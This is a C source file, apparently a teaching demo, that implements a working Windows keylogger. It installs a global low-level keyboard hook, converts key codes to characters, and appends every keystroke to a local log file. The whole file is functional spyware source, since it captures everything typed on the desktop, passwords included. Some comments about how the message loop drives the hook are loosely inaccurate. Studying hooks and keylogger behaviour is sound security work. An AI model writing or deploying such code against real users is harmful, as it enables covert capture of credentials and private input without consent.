// Demonstrate basic keylogging using WH_KEYBOARD_LL

// Ref:
//  - https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexw
//  - https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelkeyboardproc
//  - https://learn.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-kbdllhookstruct 
//  - https://learn.microsoft.com/en-us/windows/win32/winmsg/messages-and-message-queues

// Compile with: cl keylogger.c /link user32.lib
// TODO: add ability to log keystrokes based on process / window

#include <Windows.h>
#include <stdio.h>

#define LOG_FILE "keylog.txt"

HHOOK hook = NULL;

// Callback function 
LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
	if (wParam == WM_KEYDOWN) {
		KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
		DWORD vkCode = p->vkCode;
		char key = (char)vkCode;
		
		BOOL shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
		BOOL capsLock = (GetKeyState(VK_CAPITAL) & 1) != 0;
		if (capsLock) shiftPressed = !shiftPressed;  // flip case if caps lock is on

		if (shiftPressed) {
			// In ASCII a = 97 and A = 65
			if (key >= 'a' && key <= 'z') key -= 32;  // a -> A
		}
		else {
			if (key >= 'A' && key <= 'Z') key += 32;  // A -> a
		}

		// File pointer to store the return value of fopen_s
		FILE* file = NULL;
		errno_t err = fopen_s(&file, LOG_FILE, "a");
		if (err == 0 && file) {
			fprintf(file, "%c", key);
			fclose(file);
		}
	}
	return CallNextHookEx(hook, code, wParam, lParam);
}

int main() {
	// Calling SetWindowsHookEx with the dwThreadId value of 0 means that it will hook every thread
	// in the current desktop (kernel object)
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
	if (hook == NULL) {
		printf("[-] SetWindowsHookEx failed: %u\n", GetLastError());
		return 1;
	}
	else
		printf("[+] Keylogger installed. Ctrl-C to quit.\n");

	// Message pump - required to keep program alive and responsive to events
	MSG msg; // Struct to hold messages
	while (GetMessage(&msg, NULL, 0, 0) > 0) { // Grabs messages from message queue
		TranslateMessage(&msg); // Converts virtual keys (VK_A) into characters ('A')
		DispatchMessage(&msg); // Sends message (character) to our hook callback (LowLevelKeyboardProc)
	}
	
	UnhookWindowsHookEx(hook);
	return 0;
}
